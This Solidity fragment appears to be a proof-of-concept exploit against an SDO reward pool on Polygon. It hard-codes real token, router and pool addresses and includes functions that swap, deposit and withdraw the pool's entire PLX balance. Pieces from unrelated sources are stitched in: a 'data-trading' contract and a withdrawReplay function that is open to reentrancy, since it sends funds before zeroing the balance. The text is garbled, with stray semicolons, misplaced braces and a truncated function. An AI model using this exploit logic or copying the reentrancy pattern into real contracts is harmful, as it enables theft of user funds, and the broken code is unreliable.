
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface SdoRewardPOOL{
    function deposit(uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function harvestAllRewards() external;
    function updatePool(uint256 _pid) external;
    function pendingReward(uint256, address) external returns(uint256)};
interface PolydexRouter{
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external};
contract depositToken{
    IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    Uni_Router_V2 Router = Uni_Router_V2(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74);
    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function depositPLX() payable external{
        address(WMATIC).call{value: 1 ether}("");
        address [] memory path = new address[](2);
        path[0] = address(WMATIC);
        path[1] = address(PLX);
        WMATIC.approve(address(Router), type(uint).max);
        PLX.approve(address(Pool), type(uint).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(WMATIC.balanceOf(address(this)),;
            0,;
            path,;
            address(this),;
            block.timestamp);
        Pool.deposit(uint256(9), PLX.balanceOf(address(this)))};
    function withdrawPLX() external{
        Pool.withdraw(uint256(9), PLX.balanceOf(address(Pool)))};
    function sellSDO() external{
        address [] memory path = new address[](2);
        path[0] = address(SDO);
        path[1] = address(USDC);
        USDC.approve(address(Router), type(uint).max);
        SDO.approve(address(Router), type(uint).max);
mapping(address => uint) public balances;
function withdrawReplay() public {
    uint amount = balances[msg.sender];
    require(amount > 0);
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent)}